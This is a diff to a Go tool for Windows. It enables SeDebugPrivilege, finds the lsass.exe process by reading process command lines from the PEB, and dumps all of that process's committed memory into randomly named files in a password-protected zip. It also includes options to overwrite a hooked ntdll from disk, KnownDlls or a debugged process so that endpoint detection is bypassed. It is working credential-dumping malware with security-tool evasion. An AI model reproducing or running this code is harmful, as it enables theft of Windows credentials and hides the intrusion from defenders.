@@ -6,15 +6,13 @@ import (
 	"fmt"
 	"flag"
 	"unsafe"
-	"strings"
 	"syscall"
     "math/big"
     "github.com/alexmullins/zip" //"archive/zip"
-	"crypto/rand"
-	"unicode/utf8"
-	"encoding/json"
-	"unicode/utf16"
-	"golang.org/x/sys/windows"
+    "crypto/rand"
+    "encoding/json"
+    "unicode/utf16"
+    "golang.org/x/sys/windows"
 )
 
 const (
@@ -32,12 +30,13 @@ const (
     inInitializationOrderModuleList_offset uintptr = 0x30
     flink_dllbase_offset uintptr = 0x20
     flink_buffer_offset uintptr = 0x50
+    processparameters_offset = 0x20
+    commandline_offset = 0x68
     PAGE_EXECUTE_WRITECOPY uintptr = 0x80
     SEC_IMAGE_NO_EXECUTE uintptr = 0x11000000
     offset_mappeddll uintptr = 0x1000
     SECTION_MAP_READ uintptr = 0x04
     DEBUG_PROCESS uint32 = 0x01
-
 )
 
 var (
@@ -49,7 +48,6 @@ var (
 	ntOpenProcessToken *windows.LazyProc
 	ntAdjustPrivilegesToken *windows.LazyProc
 	ntClose *windows.LazyProc
-	getProcessImageFileName *windows.LazyProc
 
 	VirtualProtect *windows.LazyProc
     createFile *windows.LazyProc
@@ -169,9 +167,6 @@ func init() {
 	ntAdjustPrivilegesToken = ntdll.NewProc("NtAdjustPrivilegesToken")
 	ntClose = ntdll.NewProc("NtClose")
 	ntOpenSection = ntdll.NewProc("NtOpenSection")
-	// psapi - Can I do this with ntdll?? :(
-	psapi := windows.NewLazySystemDLL("psapi.dll")
-	getProcessImageFileName = psapi.NewProc("GetProcessImageFileNameA")
 	// kernel32
 	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
     VirtualProtect = kernel32.NewProc("VirtualProtect")
@@ -184,42 +179,42 @@ func init() {
 }
 
 
-func Reverse(s string) string {
-	size := len(s)
-	buf := make([]byte, size)
-	for start := 0; start < size; {
-		r, n := utf8.DecodeRuneInString(s[start:])
-		start += n
-		utf8.EncodeRune(buf[size-start:], r)
-	}
-	return string(buf)
+func GetProcNameFromHandle(proc_handle uintptr) (string){
+    // NtQueryInformationProcess
+    var pbi PROCESS_BASIC_INFORMATION
+    var returnLength uint32
+    status, _, _ := ntQueryInformationProcess.Call(uintptr(proc_handle), ProcessBasicInformation, uintptr(unsafe.Pointer(&pbi)), uintptr(uint32(unsafe.Sizeof(pbi))), uintptr(unsafe.Pointer(&returnLength)),)
+    if status != 0 {
+        fmt.Printf("[-] NtQueryInformationProcess failed with status: 0x%x\n", status)
+        return ""
+    }
+    peb_addr := pbi.PebBaseAddress 
+
+    // Get PEB->ProcessParameters
+    processparameters_pointer := peb_addr + uintptr(processparameters_offset)
+    processparameters_adress := read_remoteintptr(proc_handle, processparameters_pointer, 8)
+    
+    // Get ProcessParameters->CommandLine
+    commandline_pointer := processparameters_adress + uintptr(commandline_offset)
+    commandline_address := read_remoteintptr(proc_handle, commandline_pointer, 8)
+    commandline_value := read_remoteWStr(proc_handle, commandline_address, 256)
+    return commandline_value
 }
 
-func GetProcessByName(process_name string) []uintptr{
-	var proc_handles_slice []uintptr;
-	var s uintptr = 0;
-	for {
-		res, _, _ := ntGetNextProcess.Call(s, MAXIMUM_ALLOWED, 0, 0, uintptr(unsafe.Pointer(&s)))
 
-		if (res != 0) {
-			break
-		}
-
-		buf := [256]byte{}
-		var mem_address uintptr = uintptr(unsafe.Pointer(&buf[0])); 
-		res, _, _ = getProcessImageFileName.Call(s, mem_address, 256);
-
-		if (res > 1){
-			var res_string string = string(buf[0:res]);
-			var reverted_string string = Reverse(res_string);
-			var index int = strings.Index(reverted_string, "\\");
-			var result_name string = Reverse(reverted_string[0:index]);
-			if (result_name == process_name){
-				proc_handles_slice = append(proc_handles_slice, s);
-			}
-		}
-	}
-	return proc_handles_slice;
+func GetProcessByName(process_name string) uintptr{
+    var s uintptr = 0;
+    for {
+        res, _, _ := ntGetNextProcess.Call(s, MAXIMUM_ALLOWED, 0, 0, uintptr(unsafe.Pointer(&s)))
+        if (res != 0) {
+            break
+        }
+        aux_proc_name := GetProcNameFromHandle(s)
+        if (aux_proc_name == process_name){
+            return s
+        }
+    }
+    return 0
 }
 
 
@@ -231,7 +226,7 @@ func enable_SeDebugPrivilege() bool {
 	var tokenHandle syscall.Token
 	ntstatus, _, _ := ntOpenProcessToken.Call(uintptr(hProcess), uintptr(TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES), uintptr(unsafe.Pointer(&tokenHandle)))
 	if ntstatus != 0 {
-		fmt.Printf("ntOpenProcessToken status: 0x%x\n", ntstatus)
+		fmt.Printf("[-] NtOpenProcessToken error status: 0x%x\n", ntstatus)
 		return false
 	}
 	luid := LUID{ LowPart:  20, HighPart: 0,}
@@ -243,14 +238,14 @@ func enable_SeDebugPrivilege() bool {
 	// NtAdjustPrivilegesToken
 	ntstatus, _, _ = ntAdjustPrivilegesToken.Call(uintptr(tokenHandle), 0, uintptr(unsafe.Pointer(&tp)), 0, 0, 0)
 	if ntstatus != 0 {
-		fmt.Printf("NtAdjustPrivilegesToken status: 0x%x\n", ntstatus)
+		fmt.Printf("[-] NtAdjustPrivilegesToken error status: 0x%x\n", ntstatus)
 		return false
 	}
 
 	// NtClose
 	ntstatus, _, _ = ntClose.Call(uintptr(tokenHandle))
 	if ntstatus != 0 {
-		fmt.Printf("NtClose status: 0x%x\n", ntstatus)
+		fmt.Printf("[-] NtClose error status: 0x%x\n", ntstatus)
 		return false
 	}
 
@@ -265,39 +260,10 @@ func open_process(pid uintptr) uintptr {
 
 	status, _, _ := ntOpenProcess.Call(uintptr(unsafe.Pointer(&handle)), PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, uintptr(unsafe.Pointer(&objectAttributes)), uintptr(unsafe.Pointer(&clientId)))
 	if (status != 0) {
-		fmt.Printf("Failed to open process. NTSTATUS: 0x%X\n", status)
+		fmt.Printf("[-] Failed to open process. NTSTATUS: 0x%X\n", status)
 		return 0
 	}
 	return handle
-}
-
-
-func get_pid(proc_handle uintptr) uintptr {
-	var pbi PROCESS_BASIC_INFORMATION
-	var returnLength uint32
-	status, _, _ := ntQueryInformationProcess.Call(uintptr(proc_handle), ProcessBasicInformation, uintptr(unsafe.Pointer(&pbi)), uintptr(uint32(unsafe.Sizeof(pbi))), uintptr(unsafe.Pointer(&returnLength)),)
-	if status != 0 {
-		fmt.Printf("NtQueryInformationProcess failed with status: 0x%x\n", status)
-		return 0
-	}
-	pid := pbi.UniqueProcessID
-	return pid
-}
-
-
-func writeToFile(file_name string, byteArray []byte) () {
-	// Write to binary file
-	file, err := os.OpenFile(file_name, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644)
-	if err != nil {
-		fmt.Printf("Error opening file: %v\n", err)
-		return
-	}
-	defer file.Close()
-	_, err = file.Write(byteArray)
-	if err != nil {
-		fmt.Printf("Error writing to file: %v\n", err)
-		return
-	}
 }
 
 
@@ -314,12 +280,12 @@ func randomString(length int) (string) {
 }
 
 
-func read_remoteintptr(process_handle windows.Handle, base_address uintptr, size uintptr) uintptr {
+func read_remoteintptr(process_handle uintptr, base_address uintptr, size uintptr) uintptr {
     buffer := make([]byte, size)
     var bytesRead uintptr
     status, _, _ := ntReadVirtualMemory.Call(uintptr(process_handle), base_address, uintptr(unsafe.Pointer(&buffer[0])), size, uintptr(unsafe.Pointer(&bytesRead)))
-    if status != 0 {
-        fmt.Printf("NtReadVirtualMemory failed with status: 0x%x\n", status)
+    if status != 0 && status != 0x8000000d && status != 0xc0000005 {
+        fmt.Printf("[-] NtReadVirtualMemory failed with status: 0x%x\n", status)
         return 0
     }
     read_value := *(*uintptr)(unsafe.Pointer(&buffer[0]))
@@ -336,12 +302,12 @@ func utf16BytesToUTF8(utf16Bytes []byte) []byte {
 }
 
 
-func read_remoteWStr(process_handle windows.Handle, base_address uintptr, size uintptr) string {
+func read_remoteWStr(process_handle uintptr, base_address uintptr, size uintptr) string {
     buffer := make([]byte, size)
     var bytesRead uintptr
     status, _, _ := ntReadVirtualMemory.Call(uintptr(process_handle), base_address, uintptr(unsafe.Pointer(&buffer[0])), size, uintptr(unsafe.Pointer(&bytesRead)))
-    if status != 0 {
-        fmt.Printf("NtReadVirtualMemory failed with status: 0x%x\n", status)
+    if status != 0 && status != 0x8000000d && status != 0xc0000005 {
+        fmt.Printf("[-] NtReadVirtualMemory failed with status: 0x%x\n", status)
         return ""
     }
     for i := 0; i < int(bytesRead)-1; i += 1 {
@@ -355,7 +321,8 @@ func read_remoteWStr(process_handle windows.Handle, base_address uintptr, size u
 
 func get_local_lib_address(dll_name string) uintptr {
     // GetCurrentProcess
-    process_handle, _ := windows.GetCurrentProcess()
+    proc_handle, _ := windows.GetCurrentProcess()
+    process_handle := uintptr(proc_handle)
     // fmt.Printf("[+] Process Handle: \t%d\n", process_handle)
     var pbi PROCESS_BASIC_INFORMATION
     var returnLength uint32
@@ -363,7 +330,7 @@ func get_local_lib_address(dll_name string) uintptr {
     // NtQueryInformationProcess
     status, _, _ := ntQueryInformationProcess.Call(uintptr(process_handle), ProcessBasicInformation, uintptr(unsafe.Pointer(&pbi)), uintptr(uint32(unsafe.Sizeof(pbi))), uintptr(unsafe.Pointer(&returnLength)),)
     if status != 0 {
-        fmt.Printf("NtQueryInformationProcess failed with status: 0x%x\n", status)
+        fmt.Printf("[-] NtQueryInformationProcess failed with status: 0x%x\n", status)
         return 0
     }
     // fmt.Printf("[+] Process ID: \t%d\n", pbi.UniqueProcessID)
@@ -401,7 +368,8 @@ func get_local_lib_address(dll_name string) uintptr {
 
 
 func get_section_info(base_address uintptr) (uintptr,uintptr) {
-    process_handle, _ := windows.GetCurrentProcess()
+    proc_handle, _ := windows.GetCurrentProcess()
+    process_handle := uintptr(proc_handle)
     if (fmt.Sprintf("%d", process_handle) == ""){ return 0,0}
     var e_lfanew_addr uintptr = base_address + 0x3C
     var e_lfanew uintptr = read_remoteintptr(process_handle, e_lfanew_addr, 4)
@@ -419,7 +387,7 @@ func replace_ntdll_section(unhooked_ntdll_text uintptr, local_ntdll_txt uintptr,
     var oldProtect uintptr
     res, _, _ := VirtualProtect.Call(local_ntdll_txt, local_ntdll_txt_size, PAGE_EXECUTE_WRITECOPY, uintptr(unsafe.Pointer(&oldProtect)))
     if res != 1 {
-        fmt.Println("Failed to change memory protection to PAGE_EXECUTE_WRITECOPY")
+        fmt.Println("[-] Failed to change memory protection to PAGE_EXECUTE_WRITECOPY")
         return
     }
     /// fmt.Scanln()
@@ -442,7 +410,7 @@ func overwrite_disk(file_name string) uintptr {
     fileNamePtr, _ := syscall.BytePtrFromString(file_name)
     file_handle, _, err := createFile.Call(uintptr(unsafe.Pointer(fileNamePtr)), windows.GENERIC_READ, windows.FILE_SHARE_READ, 0, windows.OPEN_EXISTING, windows.FILE_ATTRIBUTE_NORMAL, 0)
     if windows.Handle(file_handle) == windows.InvalidHandle {
-        fmt.Printf("Error creating file: %v\n", err)
+        fmt.Printf("[-] Error creating file: %v\n", err)
         return 0
     }
     // fmt.Printf("[+] File handle: \t%d\n", file_handle)
@@ -451,7 +419,7 @@ func overwrite_disk(file_name string) uintptr {
     // CreateFileMappingA
     mapping_handle, _, err := createFileMapping.Call(file_handle, 0, (windows.PAGE_READONLY | SEC_IMAGE_NO_EXECUTE), 0, 0, 0)
     if mapping_handle == 0 {
-        fmt.Printf("Error creating file mapping: %v\n", err)
+        fmt.Printf("[-] Error creating file mapping: %v\n", err)
         return 0
     }
     defer windows.CloseHandle(windows.Handle(mapping_handle))
@@ -461,7 +429,7 @@ func overwrite_disk(file_name string) uintptr {
     unhooked_ntdll, _, err := mapViewOfFile.Call(mapping_handle, windows.FILE_MAP_READ, 0, 0, 0)
 
     if unhooked_ntdll == 0 {
-        fmt.Printf("Error mapping view of file: %v\n", err)
+        fmt.Printf("[-] Error mapping view of file: %v\n", err)
         return 0
     }
     // fmt.Printf("[+] Mapped Ntdll:\t0x%s\n", fmt.Sprintf("%x", unhooked_ntdll))
@@ -524,7 +492,7 @@ func overwrite_debugproc(file_path string, local_ntdll_txt uintptr, local_ntdll_
 
     success, _, err := CreateProcess.Call(uintptr(unsafe.Pointer(applicationName)), 0, 0, 0, 0, uintptr(DEBUG_PROCESS), 0, 0, uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)))   
     if (success != 1) {
-        fmt.Printf("CreateProcess failed: %v\n", err)
+        fmt.Printf("[-] CreateProcess failed: %v\n", err)
         os.Exit(0)
     }
     
@@ -533,7 +501,7 @@ func overwrite_debugproc(file_path string, local_ntdll_txt uintptr, local_ntdll_
     var bytesRead uintptr
     status, _, _ := ntReadVirtualMemory.Call(uintptr(pi.hProcess), local_ntdll_txt, uintptr(unsafe.Pointer(&buffer[0])), local_ntdll_txt_size, uintptr(unsafe.Pointer(&bytesRead)))
     if status != 0 {
-        fmt.Printf("NtReadVirtualMemory failed with status: 0x%x\n", status)
+        fmt.Printf("[-] NtReadVirtualMemory failed with status: 0x%x\n", status)
         os.Exit(0)
     }
 
@@ -608,7 +576,7 @@ func overwrite(optionFlag string, pathFlag string){
 func writeNonPwdZip (zip_file string, memFile_arr []MemFile) {
     zipFile, err := os.Create(zip_file)
     if err != nil {
-        fmt.Printf("Error creating ZIP file: %v\n", err)
+        fmt.Printf("[-] Error creating ZIP file: %v\n", err)
     }
     defer zipFile.Close()
 
@@ -618,7 +586,7 @@ func writeNonPwdZip (zip_file string, memFile_arr []MemFile) {
     for _, memFile := range memFile_arr {
         fileWriter, err := zipWriter.Create(memFile.Filename)
         if err != nil {
-            fmt.Printf("Error writing to ZIP file: %v\n", err)
+            fmt.Printf("[-] Error writing to ZIP file: %v\n", err)
         }
         _, _ = fileWriter.Write(memFile.Content)
     }
@@ -653,7 +621,7 @@ func writePwdZip (zip_file string, zip_pwd string, memFile_arr []MemFile) {
 func writeJson(json_file string, mem64list_arr []Mem64Information) {
     jsonData, err := json.Marshal(mem64list_arr)
     if err != nil {
-        fmt.Printf("Error marshaling to JSON: %v\n", err)
+        fmt.Printf("[-] Error marshaling to JSON: %v\n", err)
         return
     }
     file, err := os.Create(json_file)
@@ -676,7 +644,7 @@ func main() {
 	var optionFlagStr string
 	var pathFlagStr string
     var zipPasswordStr string
-	flag.StringVar(&optionFlagStr,  "o",  "default", "Option for library overwrite: \"disk\", \"knowndlls\" or \"debugproc\"")
+    flag.StringVar(&optionFlagStr,  "o",  "default", "Option for library overwrite: \"disk\", \"knowndlls\" or \"debugproc\"")
     flag.StringVar(&pathFlagStr,    "p",  "default", "Path to ntdll file in disk (for \"disk\" option) or program to open in debug mode (\"debugproc\" option)")
     flag.StringVar(&zipPasswordStr, "zp", "",        "Password for zip file")
     flag.Parse()
@@ -684,32 +652,30 @@ func main() {
     	overwrite(optionFlagStr, pathFlagStr)
     }
 
-	// Get PID
-	process_name := "lsass.exe"
-	proc_handle := GetProcessByName(process_name)[0]
-	pid := get_pid(proc_handle)
-	fmt.Printf("[+] Process PID:    \t%d\n", pid)
-	
-	// Get SeDebugPrivilege
-	priv_enabled := enable_SeDebugPrivilege()
-	fmt.Printf("[+] Privilege Enabled:\t%t\n", priv_enabled)
+    // Get SeDebugPrivilege
+    priv_enabled := enable_SeDebugPrivilege()
+    if (priv_enabled == false) {
+        fmt.Println("[-] It was not possible to get privileges. Not running as administrator?")
+        os.Exit(0)
+    }
+    fmt.Printf("[+] Privilege Enabled:\t%t\n", priv_enabled)
 
-	// Get process handle with correct privilege
-	proc_handle = open_process(pid)
-	fmt.Printf("[+] Process Handle: \t%d\n", proc_handle)	
-	
-	var mem_address uintptr = 0
-	var proc_max_address_l uintptr = 0x7FFFFFFEFFFF
-	
-	// Slice/Array for Mem64Information objects
+    // Get process handle
+    process_name := "C:\\WINDOWS\\system32\\lsass.exe"
+    proc_handle := GetProcessByName(process_name)
+    fmt.Printf("[+] Process Handle: \t%d\n", proc_handle)
+    
+    // Loop modules
     mem64list_arr := []Mem64Information{}
+    var mem_address uintptr = 0
+    var proc_max_address_l uintptr = 0x7FFFFFFEFFFF
     memFile_arr := []MemFile{}
     for (mem_address < proc_max_address_l){
         var memInfo MEMORY_BASIC_INFORMATION
         var resultLength uintptr
         status, _, _ := ntQueryVirtualMemory.Call(proc_handle, mem_address, 0, uintptr(unsafe.Pointer(&memInfo)), uintptr(unsafe.Sizeof(memInfo)), uintptr(unsafe.Pointer(&resultLength)))
         if status != 0 {
-            fmt.Printf("NtQueryVirtualMemory failed with status: 0x%x\n", status)
+            fmt.Printf("[-] NtQueryVirtualMemory failed with status: 0x%x\n", status)
             return
         }   
         if (memInfo.Protect != PAGE_NOACCESS && memInfo.State == MEM_COMMIT){
@@ -721,7 +687,6 @@ func main() {
             memdump_filename := randomString(9) + "." + randomString(3) //fmt.Sprintf("%x", (memInfo.BaseAddress))
             
             // Write binary file
-            // writeToFile((dirName + "\\" + memdump_filename), buffer)
             memfile := MemFile{ Filename: memdump_filename, Content: buffer}
             memFile_arr = append(memFile_arr, memfile)
 
@@ -730,6 +695,13 @@ func main() {
             mem64list_arr = append(mem64list_arr, mem64Info)
         }
         mem_address += memInfo.RegionSize
+    }
+
+    // Close handle
+    ntstatus, _, _ := ntClose.Call(uintptr(proc_handle))
+    if ntstatus != 0 {
+        fmt.Printf("[-] NtClose status: 0x%x\n", ntstatus)
+        return
     }
 
     // Write JSON file
